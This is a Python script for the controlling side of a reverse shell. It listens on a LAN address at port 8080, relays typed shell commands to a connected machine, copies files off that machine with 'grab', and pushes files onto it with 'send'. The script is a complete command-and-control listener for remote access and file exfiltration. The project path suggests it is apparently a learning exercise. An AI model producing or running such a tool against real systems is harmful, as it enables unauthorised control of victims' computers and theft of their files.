import os
import socket


def transfer(conn, command):
    conn.send(command.encode())
    print('here')
    grab, path = command.split("*")
    f = open('/root/Desktop/ ' + path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print('[-] Unable to find out the file')
            break
        f.write(bits)

def download(conn, command):
    conn.send(command.encode())
    send, command = command.split("*")
    if os.path.exists("/root/PycharmProjects/pythonProjectLsson1/"+command):
        print(os.path.exists("/root/PycharmProjects/pythonProjectLsson1/"+command))
        f = open("/root/PycharmProjects/pythonProjectLsson1/"+command, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            conn.send(packet)
            packet = f.read(1024)
        conn.send('DONE'.encode())
    else:
        print("here")
        conn.send('File not found'.encode())

def connecting():
    s = socket.socket()
    s.bind(("192.168.68.119", 8080))
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+]We got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        elif 'grab' in command:
            transfer(conn, command)

        elif 'send' in command:
            try:
                download(conn, command)
            except Exception as e:
                print(e)

        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())


def main():
    connecting()


main()
